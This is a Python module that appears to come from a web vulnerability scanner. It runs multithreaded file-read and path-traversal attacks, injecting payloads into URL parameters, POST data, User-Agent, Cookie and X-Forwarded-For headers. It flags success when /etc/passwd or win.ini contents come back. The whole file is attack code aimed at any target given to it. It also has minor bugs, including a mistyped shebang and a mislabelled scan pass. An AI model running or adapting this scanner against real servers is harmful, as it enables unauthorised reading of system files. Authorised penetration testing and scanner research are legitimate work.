#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from pub.com.outprint import ATPrintInfoSuc,ATPrintInfoPostSuc
from attack.Attack_Tihuan import attack_tihuan_url_canshu_work
from requests.packages.urllib3 import disable_warnings
from attack.Attack_Tihuan import _header_attack_tihuan_url_canshu_work
from rich.progress import Progress
from attack.Attack_Tihuan import post_attack_tihuan_url_canshu_work
from concurrent.futures import ThreadPoolExecutor,as_completed,wait
disable_warnings()


class File_ReadPoc:
    def dir_x_for(self,poc):
        header = {
            "User-Agent": self.__headers,
            "X-Forwarded-For":'id' + poc
        }
        try:
            req = requests.get(self.__base_url, headers=header, proxies=self.__proxies, verify=self.__ssl,
                               timeout=self.__timeout)
            if "root:x" in req.text or "16-bit" in req.text:
                return True, self.__base_url, "File Read", req.request.headers

        except Exception:
            pass
    def dir_header_check(self,poc):
        header = {
            "User-Agent": self.__headers["User-Agent"] + poc,
        }
        try:
            req = requests.get(self.__base_url,headers=header,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout)
            if "root:x" in req.text or "16-bit" in req.text:
                return True,self.__base_url,"File Read",req.request.headers

        except Exception:
            pass
    def dir_cookir_check(self,poc):
        header = {
            "User-Agent": self.__headers["User-Agent"],
            "Cookie": f"AGCbcjgsdJKGCUVDSGbcmnaBC{poc}"
        }
        try:
            req = requests.get(self.__base_url,headers=header,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout)
            if "root:x" in req.text or "16-bit" in req.text:
                return True,self.__base_url,"File Read",req.request.headers

        except Exception:
            pass
    def dircheck(self,url):
        try:
            req = requests.get(url,headers=self.__headers,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout)
            if "root:x" in req.text or "16-bit" in req.text:
                return True,url,"File Read",req.request.headers

        except Exception:
            pass
    def dircheck_post(self,url):
        baseurl = url.split("&attack&")[0]
        data = url.split("&attack&")[-1].strip("&")
        try:
            req = requests.post(baseurl,headers=self.__headers,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout,data=data)
            if "root:x" in req.text or "16-bit" in req.text:
                return True, url, "File POST Read", req.request.headers,req.request.body
        except Exception:
            pass
    def main(self,target,attack_url_list,progress,__craw_post_url_list):
        self.__attack_url_list = attack_tihuan_url_canshu_work(attack_url_list, "dir")
        if target['proxy']:
            if "://" in target['proxy']:
                self.__proxies = {"https": target['proxy'], "http": target['proxy']}
            else:
                self.__proxies = {"https": "http://" + target['proxy'], "http": "http://" + target['proxy']}
        else:
            self.__proxies = target['proxy']
        self.__base_url = target['url'].strip("/ ")
        self.__headers = {"User-Agent": target['header']}
        self.__ssl = target['ssl']
        self.__threads = int(target['threads'])
        self.__timeout = int(target['timeout'])
        # with Progress(transient=True) as progress:
        tasks = progress.add_task("[b cyan]File Read检测...", total=len(self.__attack_url_list))
        with ThreadPoolExecutor(self.__threads) as pool:
            futures = [pool.submit(self.dircheck, base_url) for base_url in self.__attack_url_list]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    flag, suc_url, poc_name, req = result
                    ATPrintInfoSuc(suc_url, poc_name, req)
                progress.update(tasks, advance=1)
        wait(futures)

        post_att_url_list = post_attack_tihuan_url_canshu_work(self.__base_url,__craw_post_url_list,"dir")
        if post_att_url_list:
            tasks = progress.add_task("[b cyan]File Read POST检测...", total=len(post_att_url_list))
            with ThreadPoolExecutor(self.__threads) as pool:
                futures = [pool.submit(self.dircheck_post, base_url) for base_url in post_att_url_list]
                for future in as_completed(futures):
                    result = future.result()
                    if result is not None:
                        flag, suc_url, poc_name, req,body = result
                        ATPrintInfoPostSuc(suc_url, poc_name, req,body)
                    progress.update(tasks, advance=1)
            wait(futures)

        header_poc = _header_attack_tihuan_url_canshu_work("dir")
        tasks = progress.add_task("[b cyan]File HEADER检测...", total=len(header_poc))
        with ThreadPoolExecutor(self.__threads) as pool:
            futures = [pool.submit(self.dir_header_check, base_url) for base_url in header_poc]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    flag, suc_url, poc_name, req,= result
                    ATPrintInfoSuc(suc_url, poc_name, req)
                progress.update(tasks, advance=1)
        wait(futures)

        tasks = progress.add_task("[b cyan]File COOKIE检测...", total=len(header_poc))
        with ThreadPoolExecutor(self.__threads) as pool:
            futures = [pool.submit(self.dir_cookir_check, base_url) for base_url in header_poc]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    flag, suc_url, poc_name, req, = result
                    ATPrintInfoSuc(suc_url, poc_name, req)
                progress.update(tasks, advance=1)
        wait(futures)

        tasks = progress.add_task("[b cyan]File COOKIE检测...", total=len(header_poc))
        with ThreadPoolExecutor(self.__threads) as pool:
            futures = [pool.submit(self.dir_x_for, base_url) for base_url in header_poc]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    flag, suc_url, poc_name, req, = result
                    ATPrintInfoSuc(suc_url, poc_name, req)
                progress.update(tasks, advance=1)
        wait(futures)
